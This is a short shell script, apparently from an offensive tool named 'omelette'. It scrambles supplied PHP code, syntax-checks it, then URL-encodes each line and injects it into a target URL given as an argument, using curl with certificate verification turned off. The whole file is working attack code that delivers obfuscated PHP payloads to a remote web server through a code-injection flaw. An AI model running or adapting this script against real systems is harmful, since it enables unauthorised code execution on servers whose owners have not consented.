#!/bin/sh

code=$1
./omelette "${code}" > plate
echo [*] Scrambling code
echo [*] Checking code
php -l plate >/dev/null 2>&1

if [ $? != 0 ]; then
    echo "Scrambling PHP returned broken code in file 'plate'"
    exit 2;
fi

echo [*] Injecting code by appending to URL
while read -r line; do
    p=`php -r "print urlencode('${line}');"`
    echo -n "   | ${line}\t>> $2${p} => " 
    curl -k -s -i -A "Omelette/1.0" "$2${p}" | head -1
done<plate
echo [*] Done!
